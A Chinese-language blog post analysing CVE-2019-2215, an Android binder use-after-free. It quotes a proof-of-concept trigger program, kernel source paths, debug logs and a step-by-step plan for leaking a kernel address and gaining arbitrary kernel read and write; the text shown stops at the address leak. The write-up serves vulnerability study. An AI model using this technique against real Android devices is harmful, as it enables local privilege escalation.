<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2019-2215 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2019-2215</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019/10/08</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Android_Kernel"> Android_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2019-2215"><a href="#CVE-2019-2215" class="headerlink" title="CVE-2019-2215"></a>CVE-2019-2215</h1><hr>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>该漏洞由Google公司的Project Zero小组于2017年末发现，2018年初修复了该漏洞，但2019年9被Google公司的分析小组（TAG）发现较新的android上依然存在该漏洞并确认已应用在实际攻击中。并分配CVE编号CVE-2019-2215。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>select函数主要用来监视文件描述符的变化情况，多用于实现非阻塞socket。<br>poll函数和select实现的功能差不多，但poll效率更高，作用是把当前的文件描述符挂到等待队列。在2.5.44版本后，poll被epoll取代。<br>epoll机制是Linux内核为了处理大批量文件描述符而作了改进的poll，它显著提高了程序在大量并发连接中只有少量活跃的情况下cpu的利用率。<br>epoll相关的系统调用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">epoll_create:用来创建一个epoll文件描述符。</div><div class="line">epoll_ctl:用来添加/修改/删除需要侦听的文件描述符。</div><div class="line">epoll_wait:接受发生在被监听的描述符上的，用户感兴趣的IO事假。</div><div class="line">close：关闭epoll文件描述符。</div></pre></td></tr></table></figure></p>
<p>epoll_ctl函数的控制码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">EPOLL_CTL_ADD:在epoll实例上注册目标文件描述符fd。</div><div class="line">EPOLL_CTL_MOD:更改与目标文件描述符fd相关的事件。</div><div class="line">EPOLL_CTL_DEL:从epoll实例中删除目标文件描述符fd。</div></pre></td></tr></table></figure></p>
<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>首先我们来看下该漏洞的描述，Android内核的binder驱动中的释放后重引用漏洞。成功利用该漏洞可实现本地权限升级。漏洞成因是我们通过epool_ctl选项EPOLL_CTL_ADD监听binder描述符时，会触发底层函数binder_poll分配一个binder_thread结构体并通过poll_wait函数把binder_thread结构体中的wait元素的地址添加到epoll机制的等待队列中。当别的线程使用BINDER_THREAD_EXIT选项退出binder句柄时，底层函数会去释放掉前面创建的binder_thread结构体的内存，但并不会从相应的等待队列中删除对binder_thread-&gt;wait的引用，导致程序退出时epoll清理代码使用binder_thread-&gt;wait元素时由于binder_thread结构体已经被释放而导致释放后重引用。</p>
<h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p>下面是作者给出的poc<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> fd, epfd;</div><div class="line">        <span class="keyword">struct</span> epoll_event event = &#123; .events = EPOLLIN &#125;;</div><div class="line">        fd = open(<span class="string">"/dev/binder0"</span>, O_RDONLY);</div><div class="line">        epfd = epoll_create(<span class="number">1000</span>);</div><div class="line">        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);         <span class="comment">/* 触发binder_poll去分配binder_thread结构体 */</span></div><div class="line">        ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);                <span class="comment">/* 触发释放binder_thread结构体 */</span></div><div class="line">&#125;</div><div class="line">        <span class="comment">/* 程序运行结束 会触发清理epoll的代码,导致释放后重引用 */</span></div></pre></td></tr></table></figure></p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>大概了解了该漏洞的原理之后，我们来具体分析一下该漏洞，原理挺简单，搞懂UAF我们需要明白3个问题，内存在哪申请，内存在哪释放以及内存在哪重引用。搞清楚这三个问题那么我们也就算搞明白了这个漏洞了。</p>
<h4 id="内存的申请"><a href="#内存的申请" class="headerlink" title="内存的申请"></a>内存的申请</h4><p>先来看内存的申请，触发链如下：<br>epoll_ctl:EPOLL_CTL_ADD -&gt; ep_insert -&gt; ep_item_poll -&gt; binder_poll -&gt; binder_get_thread<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">binder_poll</span><span class="params">(<span class="keyword">struct</span> file *filp,</span></span></div><div class="line">				<span class="keyword">struct</span> poll_table_struct *wait)&#123;</div><div class="line">	<span class="keyword">struct</span> binder_proc *proc = filp-&gt;private_data;</div><div class="line">	<span class="keyword">struct</span> binder_thread *thread = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">bool</span> wait_for_proc_work;</div><div class="line">	thread = binder_get_thread(proc);						<span class="comment">/*获取thread内存*/</span></div><div class="line">	<span class="keyword">if</span> (!thread)</div><div class="line">		<span class="keyword">return</span> POLLERR;</div><div class="line">	binder_inner_proc_lock(thread-&gt;proc);</div><div class="line">	thread-&gt;looper |= BINDER_LOOPER_STATE_POLL;</div><div class="line">	wait_for_proc_work = binder_available_for_proc_work_ilocked(thread);</div><div class="line">	binder_inner_proc_unlock(thread-&gt;proc);</div><div class="line">	poll_wait(filp, &amp;thread-&gt;wait, wait);					<span class="comment">/*添加thread-&gt;wait到等待队列*/</span></div><div class="line">	<span class="keyword">if</span> (binder_has_work(thread, wait_for_proc_work))</div><div class="line">		<span class="keyword">return</span> POLLIN;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">struct</span> binder_thread *<span class="title">binder_get_thread</span><span class="params">(<span class="keyword">struct</span> binder_proc *proc)</span></span>&#123;</div><div class="line">	<span class="keyword">struct</span> binder_thread *thread;</div><div class="line">	<span class="keyword">struct</span> binder_thread *new_thread;</div><div class="line">	binder_inner_proc_lock(proc);</div><div class="line">	thread = binder_get_thread_ilocked(proc, <span class="literal">NULL</span>);</div><div class="line">	binder_inner_proc_unlock(proc);</div><div class="line">	<span class="keyword">if</span> (!thread) &#123;</div><div class="line">		new_thread = kzalloc(<span class="keyword">sizeof</span>(*thread), GFP_KERNEL);		<span class="comment">/*申请内存*/</span></div><div class="line">		<span class="keyword">if</span> (new_thread == <span class="literal">NULL</span>)</div><div class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">		binder_inner_proc_lock(proc);</div><div class="line">		thread = binder_get_thread_ilocked(proc, new_thread);	<span class="comment">/*初始化并把new_thread赋值给thread*/</span></div><div class="line">		binder_inner_proc_unlock(proc);</div><div class="line">		<span class="keyword">if</span> (thread != new_thread)</div><div class="line">			kfree(new_thread);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> thread;												                <span class="comment">/*返回新申请的内存*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">poll_wait中的回调函数</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ep_ptable_queue_proc</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">wait_queue_head_t</span> *whead,</span></span></div><div class="line">				 poll_table *pt)&#123;</div><div class="line">	<span class="keyword">struct</span> epitem *epi = ep_item_from_epqueue(pt);</div><div class="line">	<span class="keyword">struct</span> eppoll_entry *pwq;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (epi-&gt;nwait &gt;= <span class="number">0</span> &amp;&amp; (pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL))) &#123;</div><div class="line">		init_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback);</div><div class="line">		pwq-&gt;whead = whead;                                        <span class="comment">/*赋值-这里是关键，因为重引用的时候就是通过pwq-&gt;whead获取的内存*/</span></div><div class="line">		pwq-&gt;base = epi;</div><div class="line">		<span class="keyword">if</span> (epi-&gt;event.events &amp; EPOLLEXCLUSIVE)</div><div class="line">			add_wait_queue_exclusive(whead, &amp;pwq-&gt;wait);</div><div class="line">		<span class="keyword">else</span></div><div class="line">			add_wait_queue(whead, &amp;pwq-&gt;wait);</div><div class="line">		list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist);</div><div class="line">		epi-&gt;nwait++;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="comment">/* We have to signal that an error occurred */</span></div><div class="line">		epi-&gt;nwait = <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当我们在用户态使用epoll_ctl函数并且使用EPOLL_CTL_ADD选项时，则可以触发到内核底层binder_poll函数。该函数首先通过binder_get_thread函数去申请一个binder_thread结构体，获取成功之后通过poll_wait函数把binder_thread结构体的wait成员添加到epoll等待队列中(注意这里的添加操作)，到此内存分配的流程我们分析完了。<br>涉及到的binder_thread结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> binder_thread &#123;</div><div class="line">	<span class="keyword">struct</span> binder_proc *proc;</div><div class="line">	<span class="keyword">struct</span> rb_node rb_node;</div><div class="line">	<span class="keyword">struct</span> list_head waiting_thread_node;</div><div class="line">	<span class="keyword">int</span> pid;</div><div class="line">	<span class="keyword">int</span> looper;</div><div class="line">	<span class="keyword">bool</span> looper_need_return;</div><div class="line">	<span class="keyword">struct</span> binder_transaction *transaction_stack;</div><div class="line">	<span class="keyword">struct</span> list_head todo;</div><div class="line">	<span class="keyword">bool</span> process_todo;</div><div class="line">	<span class="keyword">struct</span> binder_error return_error;</div><div class="line">	<span class="keyword">struct</span> binder_error reply_error;</div><div class="line">	<span class="keyword">wait_queue_head_t</span> wait;</div><div class="line">	<span class="keyword">struct</span> binder_stats stats;</div><div class="line">	<span class="keyword">atomic_t</span> tmp_ref;</div><div class="line">	<span class="keyword">bool</span> is_dead;</div><div class="line">	<span class="keyword">struct</span> task_struct *task;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> __wait_queue_head &#123;</div><div class="line">	<span class="keyword">spinlock_t</span>		lock;</div><div class="line">	<span class="keyword">struct</span> list_head	task_list;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> __wait_queue_head <span class="keyword">wait_queue_head_t</span>;</div></pre></td></tr></table></figure></p>
<p>然后来看下在何时对binder_thread结构体内存进行的释放，通过binder句柄的ioctl接口传入BINDER_THREAD_EXIT选项即可触发内核对binder_thread的释放：<br>binder_ioctl:BINDER_THREAD_EXIT -&gt; binder_thread_release -&gt; binder_thread_dec_tmpref -&gt; binder_free_thread -&gt; kfree<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">binder_free_thread</span><span class="params">(<span class="keyword">struct</span> binder_thread *thread)</span></span></div><div class="line">&#123;</div><div class="line">	BUG_ON(!list_empty(&amp;thread-&gt;todo));</div><div class="line">	binder_stats_deleted(BINDER_STAT_THREAD);</div><div class="line">	binder_proc_dec_tmpref(thread-&gt;proc);</div><div class="line">	put_task_struct(thread-&gt;task);</div><div class="line">	kfree(thread);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后再来看一下binder_thread结构体内存在哪做了重引用了：<br>.release -&gt; ep_eventpoll_release -&gt; ep_free -&gt; ep_unregister_pollwait -&gt; ep_remove_wait_queue -&gt; remove_wait_queue<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ep_remove_wait_queue</span><span class="params">(<span class="keyword">struct</span> eppoll_entry *pwq)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">wait_queue_head_t</span> *whead;</div><div class="line">	rcu_read_lock();</div><div class="line">	whead = smp_load_acquire(&amp;pwq-&gt;whead);</div><div class="line">	<span class="keyword">if</span> (whead)</div><div class="line">		remove_wait_queue(whead, &amp;pwq-&gt;wait);</div><div class="line">	rcu_read_unlock();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在对epoll句柄做release操作时会调用到ep_eventpoll_release函数，底层会执行到ep_remove_wait_queue函数，函数内通过pwq-&gt;whead获取到前面的binder_thread结构体的wait成员，然后执行链表删除操作。因为前面已经释放了binder_thread结构体，所以这里的wait引用就是释放后重引用。<br>后来通过对内核代码的分析知道我们也可以通过epoll_ctl函数的EPOLL_CTL_DEL选项去主动触发ep_eventpoll_release的调用触发释放后重引用，调用链如下。<br>epoll_ctl:EPOLL_CTL_DEL -&gt; ep_remove -&gt; ep_unregister_pollwait -&gt; ep_remove_wait_queue -&gt; remove_wait_queue<br>从等待队列中删除一个节点的流程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;4&gt;[  134.391555] c3   2145</div><div class="line">&lt;4&gt;[  134.391555] c3   2145 -1-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:0xffffffebc7020020</div><div class="line">&lt;4&gt;[  134.391555] c3   2145</div><div class="line">&lt;4&gt;[  134.391555] c3   2145 -1-[cve_2215_poc]- remove_wait_queue- q:0xffffffebc7020020 q-&gt;lock:0x30002 q-&gt;task_list:0xffffffebc7020028 q-&gt;task_list.next:0xffffffeb3516be60 q-&gt;task_list.prev:0xffffffeb3516be60 (q+0x18):0xffffffebb923b800</div><div class="line">&lt;4&gt;[  136.605430] c3   2145 -2-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffeb3516be60  task_list.next:0xffffffebc7020028 task_list.prev:0xffffffebc7020028</div><div class="line">&lt;4&gt;[  136.608541] c3   2145 -3-[cve_2215_poc]- remove_wait_queue- q:0xffffffebc7020020 q-&gt;lock:0x30002 q-&gt;task_list:0xffffffebc7020028 q-&gt;task_list.next:0xffffffebc7020028 q-&gt;task_list.prev:0xffffffebc7020028 (q+0x18):0xffffffebb923b800</div><div class="line">&lt;4&gt;[  136.609702] c3   2145 -4-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:0xffffffeb3516be60  task_list.next:0xdead000000000100 task_list.prev:0xdead000000000200</div></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_wait_queue</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">wait_queue_t</span> *wait)</span></span>&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</div><div class="line">	spin_lock_irqsave(&amp;q-&gt;lock, flags);</div><div class="line">	__remove_wait_queue(q, wait);</div><div class="line">	spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></div><div class="line">__remove_wait_queue(<span class="keyword">wait_queue_head_t</span> *head, <span class="keyword">wait_queue_t</span> *old)&#123;</div><div class="line">	list_del(&amp;old-&gt;task_list);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(<span class="keyword">struct</span> list_head *entry)</span></span>&#123;</div><div class="line">	__list_del(entry-&gt;prev, entry-&gt;next);</div><div class="line">	entry-&gt;next = LIST_POISON1;</div><div class="line">	entry-&gt;prev = LIST_POISON2;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">void</span> __list_del(<span class="keyword">struct</span> list_head *prev, <span class="keyword">struct</span> list_head *next)&#123;</div><div class="line">	next-&gt;prev = prev;</div><div class="line">	prev-&gt;next = next;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>总结一下触发流程：binder_thread申请-&gt;binder_thread释放-&gt;binder_thread-&gt;wait重引用</p>
<h4 id="补丁用意"><a href="#补丁用意" class="headerlink" title="补丁用意"></a>补丁用意</h4><p>linux补丁官网上在2017年12月份就修复了，但是怎么android又报了出来呢？<br><a href="https://lore.kernel.org/lkml/20171213000517.GB62138@gmail.com/" target="_blank" rel="external">Syzboot日志</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b</a><br>如果这个线程使用了poll，确保我们从任何epoll的数据结构中移除带有POLLFREE的等待队列，waitqueue_active是安全的，因为我们要保持内锁在这里使用。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>下面参考着文末贴出的Exp分析一下该漏洞的利用思路，利用分两步：<br>1.通过漏洞获取当前进程的task_struct地址。<br>2.利用前面获取的task_struct计算出进程limit的值，通过漏洞修改进程limit的值，实现内核的任意读写。</p>
<h5 id="泄漏task-struct地址"><a href="#泄漏task-struct地址" class="headerlink" title="泄漏task_struct地址"></a>泄漏task_struct地址</h5><p>内核地址读，思路：首先利用BINDER_THREAD_EXIT选项触发binder_thread结构体的释放，接着创建一对pipe读写句柄，利用聚合写writev函数对pipefd[1]进行写操作，写入一组我们准备好的iovec数组到内核态去占位前面释放的binder_thread结构体。因为其中有两个iovec结构体刚好能与释放的binder_thread-&gt;wait元素重合，所以使用epoll_ctl的EPOLL_CTL_DEL选项触发重引用的链表删除操作时，刚好可以把重合的第二个iovec结构体的iovec.iov_base的值改为binder_thread-&gt;wait.task_list的地址。此时用户态通过read去读取数据时，实际读取的就是iovec.base指向的内存，这样就可以从binder_thread-&gt;wait.task_list开始读取。读取的长度由iovec-&gt;iov_len控制，该长度由我们可控，这就实现了内核读的效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> iovec&#123;</div><div class="line">	<span class="keyword">void</span> __user *iov_base;</div><div class="line">	<span class="keyword">__kernel_size_t</span> iov_len;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>来看一下具体实现：<br><img src="漏洞触发前的内存布局1.png" alt="漏洞触发前的内存布局.png"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">188.781784</span>] c3   <span class="number">4058</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">188.781784</span>] c3   <span class="number">4058</span> <span class="number">-1</span>-[cve_2215_poc]- binder_poll- &amp;thread-&gt;wait:<span class="number">0xffffffd7b7a3dea0</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">188.781784</span>] c3   <span class="number">4058</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">188.781784</span>] c3   <span class="number">4058</span> <span class="number">-1</span>-[cve_2215_poc]- remove_wait_queue- q:<span class="number">0xffffffd7b7a3dea0</span> q-&gt;lock:<span class="number">0x100010000</span> q-&gt;task_list:<span class="number">0xffffffd7b7a3dea8</span> q-&gt;task_list.next:<span class="number">0x1000</span> q-&gt;task_list.prev:<span class="number">0xdeadbeef</span> (q+<span class="number">0x18</span>):<span class="number">0x1000</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">190.809424</span>] c3   <span class="number">4058</span> <span class="number">-2</span>-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:<span class="number">0xffffffd86c38ed20</span>  task_list.next:<span class="number">0xffffffd7b7a3dea8</span> task_list.prev:<span class="number">0xffffffd7b7a3dea8</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">190.809471</span>] c3   <span class="number">4058</span> <span class="number">-3</span>-[cve_2215_poc]- remove_wait_queue- q:<span class="number">0xffffffd7b7a3dea0</span> q-&gt;lock:<span class="number">0x100010000</span> q-&gt;task_list:<span class="number">0xffffffd7b7a3dea8</span> q-&gt;task_list.next:<span class="number">0xffffffd7b7a3dea8</span> q-&gt;task_list.prev:<span class="number">0xffffffd7b7a3dea8</span> (q+<span class="number">0x18</span>):<span class="number">0x1000</span></div><div class="line">&lt;<span class="number">4</span>&gt;[  <span class="number">190.809498</span>] c3   <span class="number">4058</span> <span class="number">-4</span>-[cve_2215_poc]- remove_wait_queue- wait-&gt;task_list:<span class="number">0xffffffd86c38ed20</span>  task_list.next:<span class="number">0xdead000000000100</span> task_list.prev:<span class="number">0xdead000000000200</span></div></pre></td></tr></table></figure></p>
